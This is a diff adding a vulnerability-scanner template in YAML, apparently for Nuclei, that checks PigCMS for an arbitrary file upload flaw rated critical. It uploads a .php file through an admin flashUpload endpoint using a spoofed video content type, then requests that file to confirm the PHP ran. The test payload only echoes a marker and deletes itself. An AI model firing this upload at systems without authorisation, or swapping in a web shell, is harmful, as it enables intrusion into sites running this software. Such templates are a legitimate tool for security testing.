@@ -1,0 +1,34 @@
+id: yaml-poc-pigcms-pigcms-file_upload-CT-416592
+info:
+  name: Yaml Poc Pigcms Pigcms File_Upload Ct 416592
+  author: h1ei1
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-pigcms-pigcms-file_upload-CT-416592'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload
+  body: '------WebKitFormBoundary{{rboundary}}
+
+    Content-Disposition: form-data; name="filePath"; filename="{{r1}}.php"
+
+    Content-Type: video/x-flv
+
+
+    <?php echo "{{r2}}";unlink(__FILE__);?>
+
+    ------WebKitFormBoundary{{rboundary}}--'
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+- method: GET
+  path:
+  - /cms/{{uploadfilename}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
